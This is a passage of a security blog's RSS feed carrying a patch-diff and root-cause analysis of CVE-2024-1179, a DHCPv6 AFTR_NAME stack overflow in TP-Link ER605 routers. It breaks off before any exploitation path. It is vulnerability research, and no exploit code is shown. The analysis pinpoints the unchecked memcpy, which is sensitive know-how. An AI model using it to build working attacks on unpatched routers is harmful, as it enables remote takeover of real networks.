<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/"><channel><title>Posts on Blog</title><link>https://dilagluc.github.io/en/posts/</link><description>Recent content in Posts on Blog</description><generator>Hugo -- 0.128.0</generator><language>en-US</language><lastBuildDate>Mon, 23 Jun 2025 20:32:54 +0200</lastBuildDate><atom:link href="https://dilagluc.github.io/en/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>QEMU VM Escape via DMA reentrancy</title><link>https://dilagluc.github.io/en/posts/2025/cve_analysis/qemu_vm_escape/</link><pubDate>Mon, 23 Jun 2025 20:32:54 +0200</pubDate><author>dilag</author><guid>https://dilagluc.github.io/en/posts/2025/cve_analysis/qemu_vm_escape/</guid><description>Bypass memory reentrancy guard and escape from QEMU VM using CVE 2024 3446</description><content type="text/html" mode="escaped">&lt;p>Coming soon&lt;/p></content></item><item><title>TP Link CVE-2024-1179 analysis</title><link>https://dilagluc.github.io/en/posts/2024/cve_analysis/tplink_cve_2024_1179/</link><pubDate>Mon, 25 Nov 2024 20:32:54 +0200</pubDate><author>dilag</author><guid>https://dilagluc.github.io/en/posts/2024/cve_analysis/tplink_cve_2024_1179/</guid><description>Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest</description><content type="text/html" mode="escaped"><![CDATA[<h2 id="introduction">Introduction<a href="#introduction" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>The shift to remote work has dramatically increased the importance of securing Small Office/Home Office (SOHO) network devices. These consumer devices often present security challenges due to their limited security capabilities and inconsistent update practices. This has created an urgent need to better understand and address vulnerabilities in the SOHO ecosystem.</p>
<p>This blogpost presents an in-depth technical analysis of <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1179">CVE-2024-1179</a></strong>, a vulnerability affecting TP-Link Omada ER605 routers. We&rsquo;ll describe the root cause of this vulnerability and provide an exploitation path.</p>
<h2 id="detailed-analysis">Detailed analysis<a href="#detailed-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>This vulnerability seems first to be exploited at <strong>Pwn2Own TORONTO 2023</strong> contest. The advisory from <a href="https://www.zerodayinitiative.com/advisories/ZDI-24-085/">ZDI website</a> is as follow:</p>
<blockquote>
<p>[!note]- ZDI advisory
<strong>AFFECTED VENDORS</strong>: TP-Link</p>
<p><strong>AFFECTED PRODUCTS</strong>: <a href="https://www.tp-link.com/us/business-networking/omada-sdn-router/er605/">Omada ER605</a></p>
<p><strong>VULNERABILITY DETAILS</strong> :This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability.</p>
<p>The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.</p>
<p><strong>ADDITIONAL DETAILS</strong> : Fixed in firmware: ER605(UN)_V2_2.2.4 Build 20240119</p>
</blockquote>
<p>Also on the <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1179">Nist Website</a>, we get some valuable information about the vulnerability.</p>
<blockquote>
<p>[!note]- NIST CVE-2024-1179 Detail
<strong>Description</strong>: TP-Link Omada ER605 DHCPv6 Client Options Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-22420.</p>
</blockquote>
<p>Since we have information about the fixed version, we can start a patch diff process to begin our analysis.</p>
<h3 id="patch-diffing">Patch diffing<a href="#patch-diffing" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<h4 id="retrieve-binaries">Retrieve binaries<a href="#retrieve-binaries" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>The advisory published gives us a valuable information about the component affected by this bug. It is the DHCPv6 client of the router. We also know from the advisory that the bug was fixed in the firmware version <code>ER605(UN)_V2_2.2.4 Build 20240119</code>. With all this information in hand, we can start the patch diffing process.</p>
<p>Since we want to do a patch diffing, we will  need both the vulnerable and patched DHCPv6 client binaries. We just googled the patched firmware version <code>ER605(UN)_V2_2.2.4 Build 20240119</code> and we found a link that talks about the official release of this version:
<a href="https://community.tp-link.com/en/business/forum/topic/653062">https://community.tp-link.com/en/business/forum/topic/653062</a>
On this website we also found a link to download the firmware:
<a href="https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip">https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip</a></p>
<p>The website also mentioned the exact name of the previous firmware version:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019111507.png"/><figcaption><h4> </h4></figcaption></figure>
<p>So we just googled <code>ER605(UN)_V2_2.2.3 Build 20231201</code> and found the link to download it too:
<a href="https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip">https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip</a></p>
<p>The downloaded zip archives contain a license and <code>.bin</code> file which is probably the firmware.
Using <code>binwalk</code>, we found that there is a Squashfs file system in the <code>.bin</code> file.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092317.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092601.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We then extract them using the <code>binwalk -e</code> options.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092643.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092859.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can navigate to the directory containing the file system:s</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019112718.png"/><figcaption><h4> </h4></figcaption></figure>
<p>After retrieving the Squashfs file system for both firmware versions, we can now search for the DHCPv6 client binaries and retrieve both the vulnerable and patched versions. The binary can be found in <code>/usr/sbin/dhcp6c</code> on both firmwares. We notice that the binary is a <code>ELF 32-bit</code>,  running on <code>MIPS32 version 1</code> architecture. The loader is located at <code>/lib/ld-musl-mipsel-sf.so.1</code>. So the architecture is <code>MIPSEL32</code> (<code>MIPS32</code> endianness little).</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241101112929.png"/><figcaption><h4> </h4></figcaption></figure>
<h4 id="comparison">Comparison<a href="#comparison" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>To compare the two binaries, we will first use <strong>BinDiff</strong>. Since we don&rsquo;t have an IDAPro, we are going to use Ghidra to export our binaries and load them to BinDiff. This <a href="https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/">blog post</a> explains how to to do this.
The result looks like this:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019131603.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can see on the similarity column that 4 functions have changed: <code>sub_405F08</code>, <code>sub_40C66C</code>, <code>sub_40C3B0</code> and <code>sub_402D74</code>. For example for the <code>sub_405F08</code> function, we can see changes to some basics blocs marked with blue color and some new basics blocs added in the patched version (right side), marked with red color.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019150644.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Then, we use another tool <a href="https://github.com/clearbluejar/ghidriff"><code>ghidriffs</code></a> which does some recapitulation and shows differences but between decompiled code, much more readable than assembly code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo docker run -it --rm -v <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/ghidriffs:/ghidriffs ghcr.io/clearbluejar/ghidriff:latest  ghidriffs/dhcp6c_3 ghidriffs/dhcp6c_4
</span></span></code></pre></div><p>The recap file generated by <code>ghidriffs</code> is also attached with the paper.
We can start by inspecting which strings are added to the new version.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241020154918.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can see that two strings have been added to the patched version. They are both related to the <code>DHCP6_AFTRNAME</code> options. Remember from advisory that the flaw exists within the handling of DHCP options, and <code>AFTR_NAME</code> is one of the <a href="https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml#dhcpv6-parameters-2">DHCPv6 options</a>. So <code>sub_405F08</code> is probably one of the vulnerable functions we are looking for (if there are many). Additionally, if we take a look at where these new strings were added, we can see a call to the <code>memcpy</code> function (which is a dangerous function that could lead to buffer overflow if the bounds are not correctly checked) and a check added around this function on the patched version. Also some strings explicitly mentioned <code>malformed DHCP option</code> or <code>dhcp6_get_options</code>, and we can assume that this function is the one that handle DHCPv6 options. So no doubt, this is one of the vulnerable functions we are looking for.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022164538.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022164055.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Let&rsquo;s quickly analyze the other functions we have identified earlier with BinDiff. <code>ghiddriffs</code> shows us that the functions <code>sub_40C66C</code> and <code>sub_402D74</code> are never called. We can ignore them then.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241020163942.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241020164121.png"/><figcaption><h4> </h4></figcaption></figure>
<p>For the function <code>sub_40C3B0</code>, we can see that it&rsquo;s called by the one function. Furthermore, a call to <code>strcpy</code> is replaced by <code>strncpy</code> in the patched version, so we might first think that this function is potentially vulnerable to a buffer overflow and there is something to do with it.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022102245.png"/><figcaption><h4> </h4></figcaption></figure>
<p>To be sure whether or not this function is concerned by the advisory, we need to look more closely. First, we didn&rsquo;t identify any strings in the decompiled code of this function. Second, we cross-referenced this function and its caller and found that it is related to address updating.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022171151.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We conclude that this function is not related to the advisory.</p>
<p>The vulnerable function is then the function <code>sub_405F08</code>.</p>
<h3 id="root-cause-analysis">Root Cause Analysis<a href="#root-cause-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<h4 id="static-analysis">Static analysis<a href="#static-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>As we identified earlier, the vulnerable function is <code>sub_405F08</code>. We check some of the strings in the binary against open source libraries (strings like <code>dhcp6_get_otions: unsupported authentication protocol</code>). This can make a reverse engineering process much easier. We discovered the <a href="https://github.com/opnsense/dhcp6c">OPNsense project</a> github repository. After taking a close look at this project, we found that it has a lot in common with the binary we are reversing, although there are some differences. For example, there are a lot of similarities (we will confirm this later) between the <code>sub_405F08</code> and the <a href="https://github.com/opnsense/dhcp6c/blob/94c633227403aa02e86260943b08803f2ece4657/common.c#L1569"><code>dhcp6_get_options</code> function</a>. We can use this repo as baseline for our analysis. Let&rsquo;s revisit the diff from <code>ghiddrifs</code> :</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022201840.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can see that there is a large <code>switch (case)</code>, which does some actions on each case. From picture above, we can see that the vulnerability exists in <code>case 0x40</code>. In comparison with the <a href="https://github.com/opnsense/dhcp6c/blob/94c633227403aa02e86260943b08803f2ece4657/common.c#L1569"><code>dhcp6_get_options</code> function</a>, there is also a <code>switch(case)</code> where each case is a DHCPv6 options (like <code>DH6OPT_IA_NA</code>, <code>DH6OPT_IA_NA</code>, etc).
An in depth analysis shows that this function handles any DHCPv6 options received in the first argument. Indeed, as we can see below, we can easily spot that <code>p</code>  is the pointer to the beginning of many <code>dhcp6opt</code> elements. In the for loop, we can see that the function gets the current <code>dhcp6opt</code> element (the <code>cp</code> pointer) and the next  <code>dhcp6opt</code> element based on <code>p</code>(the <code>np</code> pointer). And <code>np</code>(next pointer) is used for the next iteration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dhcp6opt {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dh6opt_type;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dh6opt_len;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* type-dependent data follows */</span>
</span></span><span style="display:flex;"><span>} <span style="color:#a6e22e">__attribute__</span> ((__packed__));
</span></span></code></pre></div><p>c
The pointer is then used to get the option type and handle it accordingly using the switch case.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030015951.png"/><figcaption><h4> </h4></figcaption></figure>
<p>As we know that this project shares a lot of similarities with the binary we are reversing, we can assume that like the function <code>dhcp6_get_options</code> functions ,  the <code>sub_405f08</code> function also handles each DHCPv6 options received in first argument.</p>
<p>From the advisory, we know that the vulnerability exists for the <code>AFTR_NAME</code> options, but we have not found such option in the <code>dhcp6_get_options</code> function.
However, from here <a href="https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml">https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml</a>, we found that  value <code>0x40=64</code> is for <code>AFTR_NAME</code>.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022202737.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can now assume that the OPNsense is used as the baseline and the <code>AFTR_NAME</code> options has been added to support this options. So case <code>0x40=64</code> corresponds to <code>AFTR_NAME</code> options and was added by TP Link to support <code>AFTR_NAME option</code>.</p>
<p>But wait, what is a DHCPv6 option ?</p>
<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc8415#section-21">RFC 8415</a>:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029235736.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029235712.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Thus, DHCPv6 options are parameters that provide additional configuration information to IPv6 clients beyond just IP addresses. Some options are:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030000200.png"/><figcaption><h4> </h4></figcaption></figure>
<p>And <code>AFTR_NAME</code> is one of the options that is used for Dual-Stack Lite. <code>AFTR</code> stands for Address Family Transition Router&rsquo;s and according to <a href="https://datatracker.ietf.org/doc/html/rfc6334">RFC 6334</a>:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030001213.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030001230.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030001321.png"/><figcaption><h4> </h4></figcaption></figure>
<p>With all this information in hand, let&rsquo;s move on.</p>
<p>Now let&rsquo;s analyze the vulnerable part of the function. As we know from earlier analysis, a check was added around a call to <code>memcpy</code> in the patched version. Let&rsquo;s focus our analysis there.
So, let&rsquo;s assume that the overflow is certainly caused by the <code>memcpy</code> function and start our analysis from there.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)local_14 <span style="color:#f92672">+</span> local_20),(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)piVar3 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)local_18),local_28);
</span></span></code></pre></div><p>The <strong>first argument</strong> of <code>memcpy</code> which is  <code>local14</code> (the destination buffer) comes from the <strong>third parameter</strong> passed to the function.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022204302.png"/><figcaption><h4> </h4></figcaption></figure>
<p>The <strong>second argument</strong>, the source buffer which is <code>puVar9</code>  comes from the the <strong>first parameter passed</strong> to the function. And the <strong>third argument</strong> (<code>local_28 = cVar1</code>) which is the byte size to copy from source to destination also comes from the <strong>first parameter</strong> passed to the function. We can also see that we can write multiples times with the destination growing up, until the <code>local_28</code> which is the size argument of <code>memcpy</code> is 0.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023100813.png"/><figcaption><h4> </h4></figcaption></figure>
<p>As we know that this function is almost equivalent to <code>dhcp6_get_options</code> from OPNsense project, let&rsquo;s check its signature.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dhcp6_get_options</span>(<span style="color:#66d9ef">struct</span> dhcp6opt <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">struct</span> dhcp6opt <span style="color:#f92672">*</span>ep, <span style="color:#66d9ef">struct</span> dhcp6_optinfo <span style="color:#f92672">*</span>optinfo)
</span></span></code></pre></div><p>The first and third parameters of this function are respectively of type <code>dhcp6opt</code> and <code>dhcp6_optinfo</code> defined as below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dhcp6opt {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dh6opt_type;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dh6opt_len;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* type-dependent data follows */</span>
</span></span><span style="display:flex;"><span>} <span style="color:#a6e22e">__attribute__</span> ((__packed__));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dhcp6_optinfo {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> duid clientID;	<span style="color:#75715e">/* DUID */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> duid serverID;	<span style="color:#75715e">/* DUID */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> rapidcommit;	<span style="color:#75715e">/* bool */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> pref;		<span style="color:#75715e">/* server preference */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int32_t</span> elapsed_time;	<span style="color:#75715e">/* elapsed time (from client to server only) */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int64_t</span> refreshtime;	<span style="color:#75715e">/* info refresh time for stateless options */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list iapd_list; <span style="color:#75715e">/* list of IA_PD */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list iana_list; <span style="color:#75715e">/* list of IA_NA */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list reqopt_list; <span style="color:#75715e">/* options in option request */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list stcode_list; <span style="color:#75715e">/* status code */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list sip_list; <span style="color:#75715e">/* SIP server list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list sipname_list; <span style="color:#75715e">/* SIP domain list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list dns_list; <span style="color:#75715e">/* DNS server list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list dnsname_list; <span style="color:#75715e">/* Domain Search list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list ntp_list; <span style="color:#75715e">/* NTP server list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list prefix_list; <span style="color:#75715e">/* prefix list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list nis_list; <span style="color:#75715e">/* NIS server list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list nisname_list; <span style="color:#75715e">/* NIS domain list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list nisp_list; <span style="color:#75715e">/* NIS+ server list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list nispname_list; <span style="color:#75715e">/* NIS+ domain list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list bcmcs_list; <span style="color:#75715e">/* BCMC server list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_list bcmcsname_list; <span style="color:#75715e">/* BCMC domain list */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rawop_list rawops; <span style="color:#75715e">/* Raw option list */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_vbuf relay_msg; <span style="color:#75715e">/* relay message */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#define relaymsg_len relay_msg.dv_len
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define relaymsg_msg relay_msg.dv_buf
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dhcp6_vbuf ifidopt; <span style="color:#75715e">/* Interface-id */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#define ifidopt_len ifidopt.dv_len
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define ifidopt_id ifidopt.dv_buf
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	u_int authflags;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#define DHCP6OPT_AUTHFLAG_NOINFO	0x1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> authproto;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> authalgorithm;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> authrdm;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* the followings are effective only when NOINFO is unset */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> authrd;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">uint32_t</span> keyid;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">struct</span> dhcp6_vbuf realm;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> offset; <span style="color:#75715e">/* offset to the HMAC field */</span>
</span></span><span style="display:flex;"><span>		} aiu_delayed;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> type;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> offset; <span style="color:#75715e">/* offset to the HMAC field */</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">char</span> val[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">/* key value */</span>
</span></span><span style="display:flex;"><span>		} aiu_reconfig;
</span></span><span style="display:flex;"><span>	} authinfo;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#define delayedauth_keyid authinfo.aiu_delayed.keyid
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define delayedauth_realmlen authinfo.aiu_delayed.realm.dv_len
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define delayedauth_realmval authinfo.aiu_delayed.realm.dv_buf
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define delayedauth_offset authinfo.aiu_delayed.offset
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define reconfigauth_type authinfo.aiu_reconfig.type
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define reconfigauth_offset authinfo.aiu_reconfig.offset
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">#define reconfigauth_val authinfo.aiu_reconfig.val
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><p>And based on the OPNsense project, our <code>memcpy</code> is almost equivalent to the following, except for the first and third argument.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030020409.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can follow their syntax and our <code>memcpy</code> can be rewritten as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(optinfo_something,something_from_cp,something_from_cp_len);
